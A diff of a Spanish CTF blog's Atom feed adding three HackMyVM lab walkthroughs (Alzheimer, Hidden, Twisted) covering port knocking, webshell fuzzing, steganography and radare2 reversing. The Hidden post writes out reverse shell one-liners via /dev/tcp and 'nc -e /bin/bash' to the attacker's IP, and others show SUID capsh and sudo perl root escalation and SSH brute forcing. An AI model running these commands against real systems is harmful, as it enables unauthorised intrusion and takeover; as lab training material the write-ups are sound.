@@ -1,4 +1,413 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-19T17:16:59-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Apuntes solo ctf y juegos hacking</title><entry><title type="html">Drifting Blues 3 , HACKMYVM</title><link href="http://localhost:4000/driftingblues3" rel="alternate" type="text/html" title="Drifting Blues 3 , HACKMYVM" /><published>2023-11-16T00:00:00-03:00</published><updated>2023-11-16T00:00:00-03:00</updated><id>http://localhost:4000/driftingblues3</id><content type="html" xml:base="http://localhost:4000/driftingblues3"><![CDATA[<p>En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-27T17:17:24-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Apuntes solo ctf y juegos hacking</title><entry><title type="html">Alzheimer, HACKMYVM</title><link href="http://localhost:4000/alzheimer" rel="alternate" type="text/html" title="Alzheimer, HACKMYVM" /><published>2023-11-27T00:00:00-03:00</published><updated>2023-11-27T00:00:00-03:00</updated><id>http://localhost:4000/alzheimer</id><content type="html" xml:base="http://localhost:4000/alzheimer"><![CDATA[<p>En esta maquina encontramos scan , port knoking ,  escalada de privilegios. 
+Como siempre vamos a empezar por localizar la maquina victima y realizar un scan de puertos.</p>
+
+<p><img src="assets/img_alzheimer/portada.png" alt="portada" /></p>
+
+<h2 id="herramientas-y-recursos-web-utilizados">Herramientas y recursos web utilizados</h2>
+
+<ul>
+  <li>arp-scan</li>
+  <li>nmap</li>
+  <li>gtofbins</li>
+</ul>
+
+<h3 id="escaneo">Escaneo</h3>
+
+<p>Empezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp-scan <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><img src="assets/img_alzheimer/arp-scan.png" alt="arp-scan" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nv">$ipvictima</span>
+</code></pre></div></div>
+
+<p><img src="assets/img_alzheimer/nmap.png" alt="nmap" /></p>
+
+<p>Como podemos observar nos muestra tres puertos el 22 y el 80 estan filtrados y el 21 abierto , así que de momento vamos al ftp ya que permite login anonimo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp <span class="nv">$ipvictima</span>
+</code></pre></div></div>
+
+<p><img src="assets/img_alzheimer/ftp.png" alt="ftp" /></p>
+
+<p>Una vez dentro de la ftp vemos que encontramos un archivo interensante y oculto.</p>
+
+<p><img src="assets/img_alzheimer/secretnote.png" alt="secretnote" /></p>
+
+<p>Vemos su contenido y anotamos las indicaciones asi como el mensaje repetido que es algo raro.” Ihavebeenalwayshere!!! “</p>
+
+<p>Nos dice que hay que hacer port knocking  en los puertos especificados , para ello instalamos knock si no lo tenemos lo instalamos y procedemos ha hacer lo que nos indica en los puertos indicados.
+El firewall abrira los puertos  ,  por lo general cuando se golpean los puertos de determinada manera se desactivan los filtros.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>knock 192.168.0.101 1000 2000 3000 <span class="nt">-v</span> <span class="nt">-d</span> 1000
+</code></pre></div></div>
+
+<p>En el primer golpeo ya nos abre el 80 ahora falta el 22 asi que seguimos con knocking que lo abre a la tercera llamada.</p>
+
+<p><img src="assets/img_alzheimer/21-80-open.png" alt="21-80" /></p>
+
+<p><img src="assets/img_alzheimer/knocking.png" alt="knock" /></p>
+
+<p><img src="assets/img_alzheimer/all-open.png" alt="allopen" /></p>
+
+<p>Una vez tengo todos los puerto abiertos me voy a chusmear la web.</p>
+
+<p><img src="assets/img_alzheimer/index-html.png" alt="index-html" /></p>
+
+<p>Vemos que contiene un mensaje firmado por medusa que puede ser usuario ya podriamos tirar con hidra y el rockyou , aunque si analizamos lo que dice es que la pass esta en un txt  y el unico txt hasta el momento era el .secretnote.txt y aparate de las instruciones venia un frase.</p>
+
+<p>Directo a ssh</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh medusa@192.168.0.101
+</code></pre></div></div>
+<h3 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h3>
+
+<p>Perfecto estamos ya en el usuario.
+Yo personalmente uso kitty como terminal y me da algunos errores como clear  , tab , etc…. asi que ejecuto :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+<p><img src="assets/img_alzheimer/login_medusa.png" alt="login" /></p>
+
+<p>El resto no me molesta asi que tiro para adelante
+Una vez dentro como siempre haremos lo mas básico buscar con sudo -l  o binarios suid</p>
+
+<p>El comando sudo -l nos arroja un /bin/id con esa informacion me acerco a gtofbins y no me arroja nada bueno y no tengo de lejos el nivel para averiguar por mi mismo si ese binario serviria para escalar .</p>
+
+<p>Ahora toca el plan B del para ello usamos find</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /  <span class="nt">-perm</span> /4000 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="assets/img_alzheimer/sudo_find.png" alt="sudo" /></p>
+
+<p>Del listado que vemos tambien podriamos usar mount para escalar si este estuviera para ser ejecutado a traves de sudo , el binario en cuestion que usaremos en esta prueba es /usr/bin/capsh vamos a gtofbins para ver como se hace.</p>
+
+<blockquote>
+  <p>Si el binario tiene el bit de SUID establecido, no deja caer los privilegios elevados y puede ser abusado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado como una puerta trasera SUID. Si se usa para correr <code class="language-plaintext highlighter-rouge">sh -p</code>, omit the <code class="language-plaintext highlighter-rouge">-p</code>argumento en sistemas como Debian (o= Stretch) que permiten el valor predeterminado <code class="language-plaintext highlighter-rouge">sh</code>para correr con privilegios SUID.
+Este ejemplo crea una copia local SUID del binario y la dirige para mantener privilegios elevados. Para interactuar con un binario SUID existente omita el primer comando y ejecutar el programa usando su ruta original.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nb">sudo install</span> <span class="nt">-m</span> <span class="o">=</span>xs <span class="si">$(</span>which capsh<span class="si">)</span> <span class="nb">.</span>
+    
+    ./capsh <span class="nt">--gid</span><span class="o">=</span>0 <span class="nt">--uid</span><span class="o">=</span>0 <span class="nt">--</span>
+</code></pre></div></div>
+
+<p>Una vez ejecutado ya somo root y podemos dedicarmos a buscar las flags o lo que te interese.</p>
+
+<p><img src="assets/img_alzheimer/capsh.png" alt="capsh" /></p>
+
+<p>Muchas gracias por leer.</p>]]></content><author><name>Quino</name></author><summary type="html"><![CDATA[En esta maquina encontramos scan , port knoking , escalada de privilegios. Como siempre vamos a empezar por localizar la maquina victima y realizar un scan de puertos.]]></summary></entry><entry><title type="html">Hidden, HACKMYVM</title><link href="http://localhost:4000/hidden" rel="alternate" type="text/html" title="Hidden, HACKMYVM" /><published>2023-11-26T00:00:00-03:00</published><updated>2023-11-26T00:00:00-03:00</updated><id>http://localhost:4000/hidden</id><content type="html" xml:base="http://localhost:4000/hidden"><![CDATA[<p>En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell</p>
+
+<p><img src="assets/img_hidden/hidden.png" alt="portada" /></p>
+
+<h2 id="herramientas-y-software-utilizado">Herramientas y software utilizado</h2>
+
+<ul>
+  <li>arp-scan</li>
+  <li>nmap</li>
+  <li>gobuster , wfuzz</li>
+  <li>sudo</li>
+  <li>python3 http.server</li>
+  <li>ncrack</li>
+</ul>
+
+<p>Una vez encontrada la maquina realizamos un scan de puertos con nmap</p>
+
+<p><img src="assets/img_hidden/nmap.png" alt="nmap" /></p>
+
+<p>Como vemos en este caso solo tenemos el puerto 22 y el 80 asi que primero vamos a ver la web y su codigo fuente.</p>
+
+<p><img src="assets/img_hidden/web1.png" alt="web1" /></p>
+
+<p>En la web nos encontramos  con una imagen con un codigo extraño y su nombre indica que lo decodifiquemos y mas abajo en un comentario nos indica que ese codigo usa un formato concreto.</p>
+
+<p><img src="assets/img_hidden/code_level1.png" alt="code_level1" /></p>
+
+<p>Nos vamos a la siguiente web https://www.dcode.fr/tic-tac-toe-cipher y buscamos la codificacion correcta para nuestro codigo para poder obtener algo legible.</p>
+
+<p><img src="assets/img_hidden/level1.png" alt="level1" /></p>
+
+<blockquote>
+  <p>¿Cuál es la diferencia entre codificar y cifrar?
+Los códigos por lo general operan sobre la semántica, significados, mientras que los cifrados operan sobre la sintaxis, símbolos. 
+Un código se almacena como un mapeo en un libro de códigos, mientras que los cifrados transforman símbolos individuales de acuerdo con un algoritmo.</p>
+</blockquote>
+
+<p>Una vez localizado y decodeado lo añadimos a /etc/hosts vamos a la web de nuevo a ver que hay.</p>
+
+<p><img src="assets/img_hidden/etc_hosts.png" alt="etc_hosts" /></p>
+
+<p><img src="assets/img_hidden/level2.png" alt="level2" /></p>
+
+<p>Como vemos no hay nada util asi que toca hacer fuzzing contra la ruta añadida en etc/hosts para buscar directorios y archivos ocultos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://sys.hidden.hmv <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/gobuster.png" alt="gobuster" /></p>
+
+<p>Como vemos nos muestra tres directorios ocultos dos de ellos son para distraernos y uno de ellos nos devuelve una web en blanco.</p>
+
+<p>Vamos a hacer fuzzing de nuevo contra ese otro directorio para ver si esconde algo mas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://sys.hidden.hmv/weapon <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+<p><img src="assets/img_hidden/level_weapon.png" alt="level_weapon" /></p>
+
+<p>Nos encuentra un archivo con nombre loot.php al que tenemos acceso pero nos devuelve una web en blanco , me hace pensar que hay una webshell , pero nos faltan datos para hacer uso de ella si es que existe .</p>
+
+<p>Esta vez neceitamos encontrar la carga que falta para poder ejecutar comandos y vamos a hacer uso de otro fuzzer en este caso wfuzz para ver si encuentra la carga util que nos faltaria.</p>
+
+<blockquote>
+  <p>Las webshell siempre tienen este fomato:
+htttp:direccion/archivo.php?loquesea=comando
+Al menos por lo que he visto hasta la fecha pero imagino que pueden crearse con otro lenguaje.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/dirb/wordlists/big.txt  <span class="nt">-u</span> http://sys.hidden.hmv/weapon/loot.php<span class="se">\?</span>FUZZ<span class="se">\=</span><span class="nb">ls</span> <span class="nt">--hw</span> 0
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/wfuzz_rce.png" alt="wfuzz_rce" /></p>
+
+<p><img src="assets/img_hidden/web_rce_ok.png" alt="web_rce_ok" /></p>
+
+<p>Como vemos en la imagen y despues de varias pruebas con otros fuzzers encontro la palabrita que nos da paso a la ejecucion de comandos remota , es momento de mandarnos una reverseshell.</p>
+
+<p>Para ello podemos buscar en internet hay varias paginas que te la crean yo uso la siguiente https://www.revshells.com/.</p>
+
+<p>Lo primero es poner nuestra maquina a la escucha:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvpn</span> 9001
+</code></pre></div></div>
+
+<p>Despues en la webshell ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Este intento no me conecto ni encodeando la url acto seguido hago lo mismo pero llamando a nc directamente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 20192.168.0.112 9001 <span class="nt">-e</span> sh
+</code></pre></div></div>
+
+<p>Con este segundo metodo tampoco me conectaba como esperaba pueden ver el error en la imagen de abajo al igual que la conexion exitosa cuando cambie el sh por un /bin/bash quedando el comando de la siguiente manera.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 20192.168.0.112 9001 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/nc_errors_ok.png" alt="nc_errors_ok.png" /></p>
+
+<p>Spanw de shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p>Aqui podemos ver el fichero que creo para verificar que la carga util era la palabra hack que por lo general usan cmd , exec , etc….</p>
+
+<p><img src="assets/img_hidden/contenido_loop.png" alt="loop" /></p>
+
+<p>Ahora como siempre lo primero sera un sudo -l o permisos suid con find para algun binario o script personal.</p>
+
+<p><img src="assets/img_hidden/sudo-l_toreto.png" alt="sudo-ltoreto" /></p>
+
+<p>Al hacer un ls sobre el home vemos que hay dos usuario toreto y atenea y el usuario toreto puede ejcutar perl con permisos sudo . 
+Vamos a gtofbins para ver como se hace y poder acceder al sistema de ficheros de toreto conservando sus privilegios.</p>
+
+<blockquote>
+  <p>Recordar que sois www-data hay que indicarle a sudo con el usuario que quereis ejecutar sudo.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> toreto perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash" ;'</span>
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/acceso_toreto.png" alt="acceso_toreto" /></p>
+
+<p>El usuario toreto no tiene nada interesante revisamos el user atenea y encontramos una carpeta oculta con un diccionario de claves , debemos descargarlo y lanzar cualquier software que permita ataque por diccionario.
+Para ello levanto un servicio web con python en el directorio</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>Descargamos el diccionario y lanzamos en mi caso ncrack</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncrack <span class="nt">-p</span> 22 <span class="nt">--user</span> atenea <span class="nt">-P</span> atenea.txt 192.168.0.101
+</code></pre></div></div>
+
+<p><img src="assets/img_hidden/ncrack.png" alt="ncrak" /></p>
+
+<p>Nos logueamos por ssh con el user y la pass y empezmos la escala final como antes con sudo -l.</p>
+
+<p><img src="assets/img_hidden/login_atenea.png" alt="login_atenea" /></p>
+
+<p><img src="assets/img_hidden/sudo_atenea.png" alt="sudo_atenea" /></p>
+
+<p>Consultamos gtofbins para ver como se hace la escala con socat.</p>
+
+<p>Para variar no olviden buscar las flags</p>
+
+<p>Muchas gracias por leer.</p>]]></content><author><name>Quino</name></author><summary type="html"><![CDATA[En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell]]></summary></entry><entry><title type="html">Twisted, HACKMYVM</title><link href="http://localhost:4000/twisted" rel="alternate" type="text/html" title="Twisted, HACKMYVM" /><published>2023-11-25T00:00:00-03:00</published><updated>2023-11-25T00:00:00-03:00</updated><id>http://localhost:4000/twisted</id><content type="html" xml:base="http://localhost:4000/twisted"><![CDATA[<p>En esta maquina encontaremos escaneo  , esteganoigrafia y lectura de binario</p>
+
+<p><img src="assets/img_twisted/twisted.png" alt="portada" /></p>
+
+<h2 id="herramientas-y-recursos-utilizados">Herramientas y recursos utilizados:</h2>
+
+<ul>
+  <li>arp-scan</li>
+  <li>nmap</li>
+  <li>stegseek</li>
+  <li>https://morsecode.world/international/decoder/audio-decoder-adaptive.html</li>
+  <li>radare2</li>
+  <li>https://reverseengineering.stackexchange.com/questions/15193/radare2-c-output</li>
+  <li>https://reverseengineering.stackexchange.com/questions/15244/how-to-use-radare2-to-disassemble-an-executable-file</li>
+</ul>
+
+<h2 id="scan">Scan</h2>
+
+<p>Una vez localizada la maquina de la victima realizamos lanzamos a nuestro amigo nmap.</p>
+
+<p><img src="assets/img_twisted/nmap.png" alt="nmap" /></p>
+
+<p>Como podemos ver nos encontramos con el puerto 80 y con el servicio ssh corriendo por el puerto 2222.</p>
+
+<p>Empezamos como siempre por lo facil observando tanto la web como su codigo fuente , el codigo fuente no tiene nada especial solo nos indica que prefiere la imagen de abajo y como a simple vista son iguales vamos a analizar las dos imagenes.</p>
+
+<p><img src="assets/img_twisted/web.png" alt="web" /></p>
+
+<p><img src="assets/img_twisted/code_index.png" alt="code_index" /></p>
+
+<h2 id="esteganografia">Esteganografia</h2>
+
+<p>Primero le paso exiftool sin exito asi que probamos de nuevo con stegseek el cual nos devuelve un txt.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stegseek cat-original.jpg ../../../Descargas/rockyou.txt/rockyou.txt
+stegseek cat-hidden.jpg ../../../Descargas/rockyou.txt/rockyou.txt
+</code></pre></div></div>
+
+<p><img src="assets/img_twisted/output_stegseek.png" alt="output" /></p>
+
+<p>Tambien estamos atentos a los nombres de los txt originales que nos devuelve stegseek.</p>
+
+<p><img src="assets/img_twisted/bat_imagenes.png" alt="bat" /></p>
+
+<p>Yo hago  login con con el user mateo , en su home hay un .wav que es una trampa y perdida de tiempo el mismo nos lo dice.”CON HUMOR”</p>
+
+<p><img src="assets/img_twisted/morse.png" alt="morse" /></p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Para esta parte como de costumbre en estos retos sencillos que me llevan un tiempo ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+find / <span class="nt">-perm</span> /4000 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="assets/img_twisted/find.png" alt="find" /></p>
+
+<p>Con find vemos que que existe un archivo llamado beroot con suid pero no consigo llegar a ese archivo , tambien hay otra note.txt en el directorio de markus el cual tampoco leer , lo que me lleva pensar que con este usuario estoy en un agujero de conejo por completo.</p>
+
+<p><img src="assets/img_twisted/note_markus.png" alt="note" /></p>
+
+<p>Vuelvo hacia atras para intentar hacer login con markus.</p>
+
+<p>Tengo exito con markus y consigo leer el txt que indica lo siguiente clave id_rsa guardada en ….
+La copiamos a nuestra maquina cambiamos a 600 los permisos y conectamos con ssh al user bonita.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa  bonita@192.168.0.108 <span class="nt">-p</span> 2222
+</code></pre></div></div>
+
+<p><img src="assets/img_twisted/ssh_id_rsa.png" alt="ssh_id_rsa" /></p>
+
+<p>Ejecutamos el binario y nos da error , aqui busque un manual de la maquina para ver que hacer porque ni puta idea en algun walktrough te ponen el codigo que se necesita pero hay que hacerlo por uno mismo con copy paste no aprendes y como he visto que  todos hacen uso de ghidra “NSA” me decante por radare2 pese a no tener ni idea de como usarlo.</p>
+
+<p>El que quiera ver porno , subir tik toks y demas adormecimientos que lo haga es libre, pero internet es la puta biblioteca de Alejandria y pocas cosas hay que no se puedan encontrar y aprender.</p>
+
+<p>Levantamos un servidor http con python3  y descargamos el fichero.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>Nos abrimos radare2 y ejecutamos lo siguiente:</p>
+
+<blockquote>
+  <p>s main  que nos llevara a la funcion principal que todo programa en c tiene
+pd   que nos mostrara el codigo decompilado
+buscamos la parte donde espera un input  “scanf” en c o buscamos la cadena de texto que nos muestra cuando lo ejecutamos cerca de esa parte esta el valor que buscamos.
+Obvio que hay maneras de hacer que sea mas legible pero repito es mi primera vez y no encontre la forma de hacerlo mas legible como lo hacen los que usan ghidra.
+La funcion cmp compara el valor introducido con el que esta escrito dentro de esa funcion.</p>
+</blockquote>
+
+<p><img src="assets/img_twisted/radare2.png" alt="radare2" /></p>
+
+<p>Ahora solo nos queda ir a alguna web a convertir el hexadecimal en decimal para obtener el codigo de beroot que nos dara acceso a root.</p>
+
+<p><img src="assets/img_twisted/convert_hextodec.png" alt="convert_hextodec.png" /></p>
+
+<p><img src="assets/img_twisted/beroot_use.png" alt="beroot_use" /></p>
+
+<h1 id="info-radare2">INFO RADARE2</h1>
+
+<blockquote>
+  <p>[0x00005430]&gt; pd?
+|Usage: p[dD][ajbrfils] [sz] [arch] [bits] # Print Disassembly
+| NOTE: len  parameter can be negative
+| NOTE:      Pressing ENTER on empty command will repeat last pd command and also seek to end of disassembled range.
+| pd N       disassemble N instructions
+| pd -N      disassemble N instructions backward
+| pD N       disassemble N bytes
+| pda        disassemble all possible opcodes (byte per byte)
+| pdb        disassemble basic block
+| pdc        pseudo disassembler output in C-like syntax
+| pdC        show comments found in N instructions
+| pdk        disassemble all methods of a class
+| pdj        disassemble to json
+| pdr        recursive disassemble across the function graph
+| pdf        disassemble function
+| pdi        like ‘pi’, with offset and bytes
+| pdl        show instruction sizes
+| pds[?]     disassemble summary (strings, calls, jumps, refs) (see pdsf and pdfs)
+| pdt        disassemble the debugger traces (see atd)</p>
+</blockquote>
+
+<blockquote>
+  <p>The <code class="language-plaintext highlighter-rouge">pc</code> command will output <em>n</em> bytes from the current seek (<code class="language-plaintext highlighter-rouge">s</code>) as a C array, where <em>n</em> is the Block size (<code class="language-plaintext highlighter-rouge">b</code>) or the length mentioned in the command.
+The output is then can be used to, for example, manipulate the array outside of radare2, build a shellcode, decrypt a buffer and so on.
+Let’s demonstrate it with a simple example.<br />
+Here’s a tiny HelloWorld.c program:
+```c
+#include  <stdio.h></stdio.h></p>
+</blockquote>
+
+<p>void main()
+{
+        printf(“Hello, World!\n”);
+}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+&gt;Let's compile it with `gcc HelloWorld.c -o HelloWorld` and open it with radare2 `r2 -A HelloWorld`
+Now let's seek to `main` and print the function:
+
+```c
+[0x00400400]&gt; s main
+[0x004004d7]&gt; pdf
+            ;-- main:
+/ (fcn) sym.main 17
+|  sym.main ();
+|           ; DATA XREF from 0x0040041d (entry0)
+|       0x004004d7      55             push rbp
+|       0x004004d8      4889e5         mov rbp, rsp
+|       0x004004db      bf74054000     mov edi, str.Hello__World_ ; "Hello, World!"
+|       0x004004e0      e80bffffff     call sym.imp.puts          ; int puts(const char *s)
+|       0x004004e5      90             nop
+|       0x004004e6      5d             pop rbp
+\       0x004004e7      c3             ret
+</code></pre></div></div>
+
+<p>De facil para mi nada esta maquina pero aprenderemos los principios para decompilar y saltarnos la seguridad de algun software.
+Benditos agujeros de conejo y no soy Alicia en el pais de las maravillas, pese a las complicaciones muy recomendada esta maquina y divertida si no sabes mucho y te gusta romperte los cuernos dale a esta.</p>
+
+<p>GRACIAS POR LEER… ACUERDENSE DE LAS FLAGS</p>]]></content><author><name>Quino</name></author><summary type="html"><![CDATA[En esta maquina encontaremos escaneo , esteganoigrafia y lectura de binario]]></summary></entry><entry><title type="html">Drifting Blues 3 , HACKMYVM</title><link href="http://localhost:4000/driftingblues3" rel="alternate" type="text/html" title="Drifting Blues 3 , HACKMYVM" /><published>2023-11-16T00:00:00-03:00</published><updated>2023-11-16T00:00:00-03:00</updated><id>http://localhost:4000/driftingblues3</id><content type="html" xml:base="http://localhost:4000/driftingblues3"><![CDATA[<p>En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.</p>
 
 <p>No es un reto extremadamente dificil en el aprendemos como usar el path para escalar privilegios y comprobaremos lo delicado que es mostrar logs a traves de un usario.</p>
 
